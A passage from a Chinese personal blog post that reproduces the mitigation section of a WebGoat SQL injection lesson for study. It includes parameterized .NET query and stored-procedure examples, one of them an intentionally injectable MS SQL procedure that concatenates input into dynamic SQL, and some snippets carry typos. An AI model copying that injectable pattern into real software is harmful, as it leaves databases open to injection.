Log and handle the SQL Exception &#125;<br>  &#125;<br>  return data;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="Parameterized-Queries-NET">Parameterized Queries - .NET</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">public static bool isUsernameValid(string username) &#123;<br>	RegEx r = new Regex(&quot;^[A-Za-z0-9]&#123;16&#125;$&quot;);<br>	Return r.isMatch(username);<br>&#125;<br><br>// SqlConnection conn is set and opened elsewhere for brevity.<br>try &#123;<br>	string selectString = &quot;SELECT * FROM user_table WHERE username = @userID&quot;;<br>	SqlCommand cmd = new SqlCommand( selectString, conn );<br>	if ( isUsernameValid( uid ) ) &#123;<br>		cmd.Parameters.Add( &quot;@userID&quot;, SqlDbType.VarChar, 16 ).Value = uid;<br>		SqlDataReader myReader = cmd.ExecuteReader();<br>		if ( myReader ) &#123;<br>			// make the user record active in some way.<br>			myReader.Close();<br>		&#125;<br>	&#125; else &#123; // handle invalid input &#125;<br>&#125;<br>catch (Exception e) &#123; // Handle all exceptions... &#125;<br></code></pre></td></tr></table></figure><h4 id="Stored-Procedures">Stored Procedures</h4><p>Only if stored procedure does not generate dynamic SQL</p><h5 id="Safe-Stored-Procedure-Microsoft-SQL-Server">Safe Stored Procedure (Microsoft SQL Server)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">CREATE PROCEDURE ListCustomers(@Country nvarchar(30))<br>AS<br>SELECT city, COUNT(*)<br>FROM customers<br>WHERE country LIKE @Country GROUP BY city<br><br>EXEC ListCustomers ‘USA’<br></code></pre></td></tr></table></figure><h5 id="Injectable-Stored-Procedure-Microsoft-SQL-Server">Injectable Stored Procedure (Microsoft SQL Server)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">CREATE PROEDURE getUser(@lastName nvarchar(25))<br>AS<br>declare @sql nvarchar(255)<br>set @sql = &#x27;SELECT * FROM users WHERE<br>            lastname = + @LastName + &#x27;<br>exec sp_executesql @sql<br></code></pre></td></tr></table></figure><p>有一个比较头疼的问题，我当初java学得一般，目前已经忘得差不多了，看看代码尚可，写就。。。建议参考之前的两篇文章or2</p><p>啊他们写得真好啊.jpg</p><p>我的webgoat系列只是复制粘贴lesson内容罢了，只为了以后想看时不用打开虚拟机docker，可是又有什么意义呢？像极了浪费时间。</p><p>还有二十天期末考试，有些焦虑。sql注入部分结束后先准备考试吧w</p></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者:</span> <span class="post-copyright-info"><a href="mailto:undefined" rel="external nofollow noreferrer">Foo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接:</span> <span class="post-copyright-info"><a href="https://foopi.top/posts/f6ab3c74/">https://foopi.top/posts/f6ab3c74/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明:</span> <span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://foopi.top" target="_blank">Time of Pi</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/WebGoat/">WebGoat</a></div><div class="post_share"></div></div><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/4cfedd8d/" title="WebGoat实战: General"><img class="cover" src="https://img.foopi.top/img/loading.gif" data-lazy-src="https://img.foopi.top/cover/nicebrain.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-05-25</div><div class="title">WebGoat实战: General</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://img.foopi.top/img/loading.gif" data-lazy-src="https://img.foopi.top/img/avatar.webp" onerror='this.onerror=null,this.src="/img/friend_404.gif"' alt="avatar"></div><div class="author-info__name">Foo</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">28</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div></div><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/lucifer9735" rel="external nofollow noreferrer" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:lucifer9735@gmail.com" rel="external nofollow noreferrer" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来访，喜欢请收藏w</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Injection-intro"><span class="toc-number">1.</span> <span class="toc-text">SQL Injection (intro)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#What-is-SQL"><span class="toc-number">1.1.</span> <span class="toc-text">What is SQL?</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Data-Manipulation-Language-DML"><span class="toc-number">1.1.1.</span> <span class="toc-text">Data Manipulation Language (DML)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Data-Definition-Language-DDL"><span class="toc-number">1.1.2.</span> <span class="toc-text">Data Definition Language (DDL)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Data-Control-Language-DCL"><span class="toc-number">1.1.3.</span> <span class="toc-text">Data Control Language (DCL)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#What-is-SQL-injection"><span class="toc-number">1.2.</span> <span class="toc-text">What is SQL injection?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Consequences-of-SQL-injection"><span class="toc-number">1.3.</span> <span class="toc-text">Consequences of SQL injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Severity-of-SQL-injection"><span class="toc-number">1.4.</span> <span class="toc-text">Severity of SQL injection</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Injection-advanced"><span class="toc-number">2.</span> <span class="toc-text">SQL Injection (advanced)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Special-Characters"><span class="toc-number">2.1.</span> <span class="toc-text">Special Characters</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Special-Statements"><span class="toc-number">2.2.</span> <span class="toc-text">Special Statements</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Union"><span class="toc-number">2.2.1.</span> <span class="toc-text">Union</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Joins"><span class="toc-number">2.2.2.</span> <span class="toc-text">Joins</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Blind-SQL-injection-%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.3.</span> <span class="toc-text">Blind SQL injection 盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Difference"><span class="toc-number">2.3.1.</span> <span class="toc-text">Difference</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Example"><span class="toc-number">2.3.2.</span> <span class="toc-text">Example</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Injection-mitigation"><span class="toc-number">3.</span> <span class="toc-text">SQL Injection (mitigation)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Immutable-Queries"><span class="toc-number">3.1.</span> <span class="toc-text">Immutable Queries</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Static-Queries"><span class="toc-number">3.1.1.</span> <span class="toc-text">Static Queries</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Parameterized-Queries"><span class="toc-number">3.1.2.</span> <span class="toc-text">Parameterized Queries</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Parameterized-Queries-Java-Snippet"><span class="toc-number">3.1.2.1.</span> <span class="toc-text">Parameterized Queries - Java Snippet</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Parameterized-Queries-Java-Example"><span class="toc-number">3.1.2.2.</span> <span class="toc-text">Parameterized Queries - Java Example</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Parameterized-Queries-NET"><span class="toc-number">3.1.2.3.</span> <span class="toc-text">Parameterized Queries - .NET</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Stored-Procedures"><span class="toc-number">3.1.3.</span> <span class="toc-text">Stored Procedures</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Safe-Stored-Procedure-Microsoft-SQL-Server"><span class="toc-number">3.1.3.1.</span> <span class="toc-text">Safe Stored Procedure (Microsoft SQL Server)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Injectable-Stored-Procedure-Microsoft-SQL-Server"><span class="toc-number">3.1.3.2.</span> <span class="toc-text">Injectable Stored Procedure (Microsoft SQL Server)</span></a></li></ol></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By Foo</div><div class="framework-info"><span>框架</span> <a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题</span> <a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>var preloader={endLoading:()=>{document.body.style.overflow="auto",document.getElementById("loading-box").classList.add("loaded")},initLoading:()=>{document.body.style.overflow="",document.getElementById("loading-box").classList.remove("loaded")}};window.addEventListener("load",preloader.endLoading())</script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>